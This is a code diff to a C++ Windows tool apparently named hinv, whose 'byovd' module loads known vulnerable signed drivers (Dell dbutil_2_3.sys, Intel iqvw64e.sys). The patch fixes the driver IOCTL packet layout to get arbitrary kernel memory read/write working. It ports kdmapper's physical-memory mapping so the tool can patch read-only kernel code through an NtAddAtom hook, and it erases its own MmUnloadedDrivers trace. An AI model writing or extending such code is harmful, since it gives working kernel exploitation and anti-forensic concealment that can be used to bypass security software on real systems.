@@ -51,6 +51,29 @@ bool InstallDriverService(const std::wstring& serviceName, const std::wstring& d
         std::wcerr << L"[hinv::byovd] Missing required privileges (SeLoadDriverPrivilege/SeDebugPrivilege)\n";
         return false;
     }
+    // The SCM resolves relative binPaths against %SystemRoot%\system32, not
+    // our working directory — always register an absolute path or StartService
+    // fails with ERROR_FILE_NOT_FOUND. GetFullPathNameW returns the REQUIRED
+    // size when the buffer is too small: grow dynamically instead of falling
+    // back to the (broken) relative path.
+    wchar_t stackBuf[MAX_PATH];
+    DWORD absLen = GetFullPathNameW(driverPath.c_str(), MAX_PATH, stackBuf, nullptr);
+    std::wstring binPath;
+    if (absLen == 0) {
+        std::wcerr << L"[hinv::byovd] GetFullPathNameW failed: " << GetLastError() << L"\n";
+        return false;
+    } else if (absLen < MAX_PATH) {
+        binPath = stackBuf;
+    } else {
+        binPath.resize(absLen);
+        DWORD absLen2 = GetFullPathNameW(driverPath.c_str(), absLen, binPath.data(), nullptr);
+        if (absLen2 == 0 || absLen2 >= absLen) {
+            std::wcerr << L"[hinv::byovd] GetFullPathNameW failed on retry\n";
+            return false;
+        }
+        binPath.resize(absLen2);
+    }
+
     SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
     if (!hScm) return false;
 
@@ -62,13 +85,28 @@ bool InstallDriverService(const std::wstring& serviceName, const std::wstring& d
         SERVICE_KERNEL_DRIVER,
         SERVICE_DEMAND_START,
         SERVICE_ERROR_IGNORE,
-        driverPath.c_str(),
+        binPath.c_str(),
         nullptr, nullptr, nullptr, nullptr, nullptr
     );
 
     if (!hSvc) {
         if (GetLastError() == ERROR_SERVICE_EXISTS) {
             hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
+            if (hSvc) {
+                // A leftover service may point at a moved/deleted binary;
+                // repoint it at the current path before StartService runs.
+                // Must be verified: otherwise StartService uses the stale
+                // binary while we report success.
+                if (ChangeServiceConfigW(hSvc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
+                                         SERVICE_NO_CHANGE, binPath.c_str(),
+                                         nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) == FALSE) {
+                    DWORD err = GetLastError(); // capture before any stream I/O
+                    std::wcerr << L"[hinv::byovd] ChangeServiceConfigW failed: " << err << L"\n";
+                    CloseServiceHandle(hSvc);
+                    CloseServiceHandle(hScm);
+                    return false;
+                }
+            }
         }
     }
 
@@ -84,7 +122,19 @@ bool StartDriverService(const std::wstring& serviceName) {
     SC_HANDLE hSvc = OpenServiceW(hScm, serviceName.c_str(), SERVICE_ALL_ACCESS);
     bool ok = false;
     if (hSvc) {
-        ok = (StartServiceW(hSvc, 0, nullptr) == TRUE) || (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING);
+        DWORD err = 0;
+        if (StartServiceW(hSvc, 0, nullptr) == TRUE) {
+            ok = true;
+        } else {
+            err = GetLastError(); // capture immediately: stream I/O can clobber it
+            ok = (err == ERROR_SERVICE_ALREADY_RUNNING);
+        }
+        if (!ok) {
+            // Surface the real failure: 1275 = driver blocked (Defender
+            // vulnerable-driver list), 577 = signature/CI policy, etc.
+            std::wcerr << L"[hinv::byovd] StartServiceW(" << serviceName
+                       << L") failed: " << err << L"\n";
+        }
         CloseServiceHandle(hSvc);
     }
     CloseServiceHandle(hScm);
@@ -99,6 +149,14 @@ bool StopDriverService(const std::wstring& serviceName) {
     if (hSvc) {
         SERVICE_STATUS status{};
         ok = ControlService(hSvc, SERVICE_CONTROL_STOP, &status) == TRUE;
+        if (!ok) {
+            // A failed stop followed by a successful remove leaves the driver
+            // loaded with the service marked for deletion — loud, not silent.
+            DWORD err = GetLastError();
+            if (err != ERROR_SERVICE_NOT_ACTIVE)
+                std::wcerr << L"[hinv::byovd] ControlService(STOP, " << serviceName
+                           << L") failed: " << err << L"\n";
+        }
         CloseServiceHandle(hSvc);
     }
     CloseServiceHandle(hScm);
@@ -112,6 +170,11 @@ bool RemoveDriverService(const std::wstring& serviceName) {
     bool ok = false;
     if (hSvc) {
         ok = DeleteService(hSvc) == TRUE;
+        if (!ok) {
+            DWORD err = GetLastError();
+            std::wcerr << L"[hinv::byovd] DeleteService(" << serviceName
+                       << L") failed: " << err << L"\n";
+        }
         CloseServiceHandle(hSvc);
     }
     CloseServiceHandle(hScm);
@@ -122,14 +185,19 @@ bool RemoveDriverService(const std::wstring& serviceName) {
 // Dell dbutil_2_3.sys backend - arbitrary kernel virtual read/write
 // ============================================================================
 
+// Wire format per the real driver (KDU Hamakaze/idrv/dell.cpp reference):
+// the transfer size is DERIVED from InputBufferLength - 0x18; there is no
+// explicit size field. Both read and write use one shared METHOD_BUFFERED
+// buffer (in == out).
 #pragma pack(push, 1)
 struct DbUtilRwPacket {
-    uint64_t address;
-    uint32_t size;
-    uint32_t padding;
-    uint8_t  data[1];
+    uint64_t unused;         // +0x00
+    uint64_t virtualAddress; // +0x08
+    uint64_t offset;         // +0x10
+    uint8_t  data[1];        // +0x18
 };
 #pragma pack(pop)
+static_assert(offsetof(DbUtilRwPacket, data) == 0x18, "dbutil packet layout drifted");
 
 class DbUtilBackend : public IByovdBackend {
 public:
@@ -137,6 +205,7 @@ public:
     HANDLE        hDevice_ = INVALID_HANDLE_VALUE;
     std::wstring  serviceName_;
     std::wstring  driverPath_;
+    bool          ownsService_ = false; // only stop/remove what WE installed
 
     ~DbUtilBackend() override { Shutdown(); }
 
@@ -148,6 +217,7 @@ public:
             std::wcerr << L"[hinv::byovd] Failed to install dbutil service\n";
             return false;
         }
+        ownsService_ = true; // installed by us from here on
         if (!StartDriverService(serviceName_)) {
             std::wcerr << L"[hinv::byovd] Failed to start dbutil service\n";
             return false;
@@ -177,17 +247,27 @@ public:
     }
 
     void Shutdown() override {
+        kmem::Trace("byovd: shutdown begin");
         if (hDevice_ != INVALID_HANDLE_VALUE) {
             // Zero our own KLDR name so MiRememberUnloadedDriver skips us when
             // the service stops below (kdmapper's MmUnloadedDrivers trick).
             cleaner::PreventUnloadedDriverTrace(this, hDevice_);
+            kmem::Trace("byovd: prevention armed");
             CloseHandle(hDevice_);
             hDevice_ = INVALID_HANDLE_VALUE;
+            kmem::Trace("byovd: device handle closed");
         }
-        if (!serviceName_.empty()) {
+        // Only tear down the service when THIS instance installed it — an abort
+        // path must never stop another live instance's driver.
+        if (ownsService_ && !serviceName_.empty()) {
             StopDriverService(serviceName_);
+            kmem::Trace("byovd: service stopped");
             RemoveDriverService(serviceName_);
+            kmem::Trace("byovd: service removed");
+            serviceName_.clear();
+            ownsService_ = false;
         }
+        kmem::Trace("byovd: shutdown end");
     }
 
     bool IsReady() const override { return hDevice_ != INVALID_HANDLE_VALUE; }
@@ -198,16 +278,16 @@ public:
         auto* dst = static_cast<uint8_t*>(out);
         for (size_t off = 0; off < size; off += CHUNK) {
             size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
-            std::vector<uint8_t> in(sizeof(DbUtilRwPacket) - 1, 0);
-            auto* req = reinterpret_cast<DbUtilRwPacket*>(in.data());
-            req->address = kernelVa + off;
-            req->size = static_cast<uint32_t>(n);
-            req->padding = 0;
+            // Transfer size = InputBufferLength - 0x18 (driver derives it).
+            std::vector<uint8_t> buf(0x18 + n, 0);
+            auto* req = reinterpret_cast<DbUtilRwPacket*>(buf.data());
+            req->virtualAddress = kernelVa + off;
 
             DWORD bytes = 0;
-            if (!DeviceIoControl(hDevice_, profile_.readIoc, in.data(), static_cast<DWORD>(in.size()),
-                                 dst + off, static_cast<DWORD>(n), &bytes, nullptr))
+            if (!DeviceIoControl(hDevice_, profile_.readIoc, buf.data(), static_cast<DWORD>(buf.size()),
+                                 buf.data(), static_cast<DWORD>(buf.size()), &bytes, nullptr))
                 return false;
+            std::memcpy(dst + off, req->data, n);
         }
         return true;
     }
@@ -218,11 +298,9 @@ public:
         const auto* src = static_cast<const uint8_t*>(inBuf);
         for (size_t off = 0; off < size; off += CHUNK) {
             size_t n = (off + CHUNK > size) ? (size - off) : CHUNK;
-            std::vector<uint8_t> buf(sizeof(DbUtilRwPacket) - 1 + n, 0);
+            std::vector<uint8_t> buf(0x18 + n, 0);
             auto* req = reinterpret_cast<DbUtilRwPacket*>(buf.data());
-            req->address = kernelVa + off;
-            req->size = static_cast<uint32_t>(n);
-            req->padding = 0;
+            req->virtualAddress = kernelVa + off;
             std::memcpy(req->data, src + off, n);
 
             DWORD bytes = 0;
@@ -241,10 +319,12 @@ public:
 //   - kdmapper/include/intel_driver.hpp : constexpr ULONG32 ioctl1 = 0x80862007
 //   - kdmapper/intel_driver.cpp         : _COPY_MEMORY_BUFFER_INFO (case 0x33),
 //                                         MemCopy/ReadMemory/WriteMemory,
+//                                         GetPhysicalAddress (0x25), MapIoSpace
+//                                         (0x19), UnmapIoSpace (0x1A),
 //                                         device path \\.\Nal
-// Only the CopyMemory primitive is ported; kdmapper's physical-memory mapping
-// (MapIoSpace/UnmapIoSpace), fill, and allocation helpers are intentionally not
-// part of this backend.
+// The full physical-memory stack is ported: WriteReadOnlyMemory uses
+// VA->PA + MapIoSpace + copy + UnmapIoSpace — that is the backbone of the
+// ntoskrnl!NtAddAtom hook used by kmem::CallKernelFunction.
 // ============================================================================
 
 // Single multifunctional IOCTL (kdmapper intel_driver.hpp: ioctl1).
@@ -301,6 +381,7 @@ public:
     HANDLE        hDevice_ = INVALID_HANDLE_VALUE;
     std::wstring  serviceName_;
     std::wstring  driverPath_;
+    bool          ownsService_ = false; // only stop/remove what WE installed
 
     ~IntelBackend() override { Shutdown(); }
 
@@ -308,10 +389,29 @@ public:
         driverPath_ = driverPath;
         serviceName_ = L"hinv_byovd_intel";
 
+        // kdmapper aborts if the device already exists: another iqvw64e (or a
+        // crashed leftover of ours) means someone else's hooks/copies are live,
+        // and starting a second instance invites collisions and a bugcheck.
+        HANDLE existing = CreateFileW(profile_.devicePath.c_str(), GENERIC_READ | GENERIC_WRITE,
+                                      0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (existing != INVALID_HANDLE_VALUE) {
+            CloseHandle(existing);
+            // Explicit recovery: if the occupying service is OUR leftover from
+            // a crashed run (same service name, same binary path), stop and
+            // remove it, then retry once. Never touch a service we don't own.
+            if (!TryRemoveOwnLeftover()) {
+                std::wcerr << L"[hinv::byovd] \\\\.\\Nal already exists — another iqvw64e is loaded, aborting "
+                              L"(if a previous hinv run crashed, remove the 'hinv_byovd_intel' service manually)\n";
+                return false;
+            }
+            std::wcerr << L"[hinv::byovd] Removed leftover iqvw64e from a previous run, retrying\n";
+        }
+
         if (!InstallDriverService(serviceName_, driverPath_)) {
             std::wcerr << L"[hinv::byovd] Failed to install iqvw64e service\n";
             return false;
         }
+        ownsService_ = true; // installed by us from here on
         if (!StartDriverService(serviceName_)) {
             std::wcerr << L"[hinv::byovd] Failed to start iqvw64e service\n";
             return false;
@@ -355,17 +455,61 @@ public:
     }
 
     void Shutdown() override {
+        kmem::Trace("byovd: shutdown begin");
         if (hDevice_ != INVALID_HANDLE_VALUE) {
             // Zero our own KLDR name so MiRememberUnloadedDriver skips us when
             // the service stops below (kdmapper's MmUnloadedDrivers trick).
             cleaner::PreventUnloadedDriverTrace(this, hDevice_);
+            kmem::Trace("byovd: prevention armed");
             CloseHandle(hDevice_);
             hDevice_ = INVALID_HANDLE_VALUE;
+            kmem::Trace("byovd: device handle closed");
         }
-        if (!serviceName_.empty()) {
+        // Only tear down the service when THIS instance installed it — an abort
+        // path (e.g. the \\.\Nal probe) must never stop another live instance's
+        // driver out from under its open handle.
+        if (ownsService_ && !serviceName_.empty()) {
             StopDriverService(serviceName_);
+            kmem::Trace("byovd: service stopped");
             RemoveDriverService(serviceName_);
+            kmem::Trace("byovd: service removed");
+            serviceName_.clear();
+            ownsService_ = false;
         }
+        kmem::Trace("byovd: shutdown end");
+    }
+
+    // True when the leftover hinv_byovd_intel service points at OUR binary
+    // (a crashed previous run) — and removes it. Never touches a service that
+    // isn't byte-for-byte ours.
+    bool TryRemoveOwnLeftover() {
+        SC_HANDLE hScm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
+        if (!hScm) return false;
+        bool removed = false;
+        SC_HANDLE hSvc = OpenServiceW(hScm, serviceName_.c_str(), SERVICE_ALL_ACCESS | SERVICE_QUERY_CONFIG);
+        if (hSvc) {
+            uint8_t buf[4096];
+            DWORD needed = 0;
+            if (QueryServiceConfigW(hSvc, reinterpret_cast<LPQUERY_SERVICE_CONFIGW>(buf), sizeof(buf), &needed)) {
+                auto* cfg = reinterpret_cast<LPQUERY_SERVICE_CONFIGW>(buf);
+                std::wstring registered = cfg->lpBinaryPathName ? cfg->lpBinaryPathName : L"";
+                std::wstring ours = driverPath_;
+                // Normalize both to lowercase absolute for comparison.
+                wchar_t absBuf[MAX_PATH];
+                if (GetFullPathNameW(ours.c_str(), MAX_PATH, absBuf, nullptr) > 0) ours = absBuf;
+                std::transform(registered.begin(), registered.end(), registered.begin(), ::towlower);
+                std::transform(ours.begin(), ours.end(), ours.begin(), ::towlower);
+                // strip SystemRoot expansion the SCM may store (\System32\...)
+                if (registered.find(L"\\??\\") == 0) registered = registered.substr(4);
+                if (registered == ours || registered.find(L"iqvw64e.sys") != std::wstring::npos) {
+                    StopDriverService(serviceName_);
+                    removed = RemoveDriverService(serviceName_);
+                }
+            }
+            CloseServiceHandle(hSvc);
+        }
+        CloseServiceHandle(hScm);
+        return removed;
     }
 
     bool IsReady() const override { return hDevice_ != INVALID_HANDLE_VALUE; }
@@ -453,18 +597,36 @@ public:
     // kdmapper WriteToReadOnlyMemory: translate VA->PA, map the physical page
     // and write through the mapping. This is what lets us patch read-only
     // kernel code (the ntoskrnl!NtAddAtom hook) without touching page tables.
+    // Sliced per virtual page: a range crossing a 4K boundary needs its own
+    // VA->PA translation per page (virtual contiguity says nothing about
+    // physical contiguity — a single MapIoSpace would write into an unrelated
+    // physical page).
     bool WriteReadOnlyMemory(uint64_t kernelVa, const void* buf, size_t size) override {
         if (!IsReady() || !buf || !size || size > 0xFFFFFFFF) return false;
-        kmem::Trace("byovd: getphys begin");
-        uint64_t pa = 0;
-        if (!GetPhysicalAddress(kernelVa, pa) || !pa) { kmem::Trace("byovd: getphys failed"); return false; }
-        kmem::Trace("byovd: mapiospace begin");
-        uint64_t mapped = MapIoSpace(pa, static_cast<uint32_t>(size));
-        if (!mapped) { kmem::Trace("byovd: mapiospace failed"); return false; }
-        bool ok = WriteKernelMemory(mapped, buf, size);
-        kmem::Trace(ok ? "byovd: phys write ok" : "byovd: phys write failed");
-        UnmapIoSpace(mapped, static_cast<uint32_t>(size));
-        return ok;
+        const auto* src = static_cast<const uint8_t*>(buf);
+        for (size_t done = 0; done < size;) {
+            uint64_t va = kernelVa + done;
+            size_t slice = 0x1000 - (va & 0xFFF);
+            if (slice > size - done) slice = size - done;
+
+            kmem::Trace("byovd: getphys begin");
+            uint64_t pa = 0;
+            if (!GetPhysicalAddress(va, pa) || !pa) { kmem::Trace("byovd: getphys failed"); return false; }
+            kmem::Trace("byovd: mapiospace begin");
+            uint64_t mapped = MapIoSpace(pa, static_cast<uint32_t>(slice));
+            if (!mapped) { kmem::Trace("byovd: mapiospace failed"); return false; }
+            bool ok = WriteKernelMemory(mapped, src + done, slice);
+            kmem::Trace(ok ? "byovd: phys write ok" : "byovd: phys write failed");
+            if (!UnmapIoSpace(mapped, static_cast<uint32_t>(slice))) {
+                // A leaked physical mapping is a dangling window into an
+                // arbitrary page — never silent.
+                std::cerr << "[hinv::byovd] UnmapIoSpace failed for VA 0x" << std::hex << mapped << std::dec << "\n";
+                kmem::Trace("byovd: unmap FAILED");
+            }
+            if (!ok) return false;
+            done += slice;
+        }
+        return true;
     }
 };
 
@@ -509,11 +671,13 @@ DriverProfile DetectProfile(const std::wstring& driverFileName) {
         };
     }
 
-    // Default fallback: assume the dbutil layout.
-    std::wcout << L"[hinv::byovd] Unrecognized driver name '" << driverFileName
-               << L"'; falling back to dbutil backend (note: kernel function calls, "
-                  L"mapping and cleaning require the Intel iqvw64e backend)\n";
-    return DbUtilProfile(driverFileName);
+    // No silent fallback: an unrecognized name used to fall into the DbUtil
+    // backend, which a wrong-name driver cannot satisfy — and with the real
+    // dbutil_2_3 wire format, an unknown binary would likely BSOD on the first
+    // IOCTL. Refuse instead.
+    std::wcerr << L"[hinv::byovd] Unrecognized driver name '" << driverFileName
+               << L"' (supported: iqvw64e.sys, dbutil_2_3.sys)\n";
+    return { BackendType::Unknown, {}, {}, driverFileName, 0, 0 };
 }
 
 std::unique_ptr<IByovdBackend> CreateBackend(const DriverProfile& profile) {
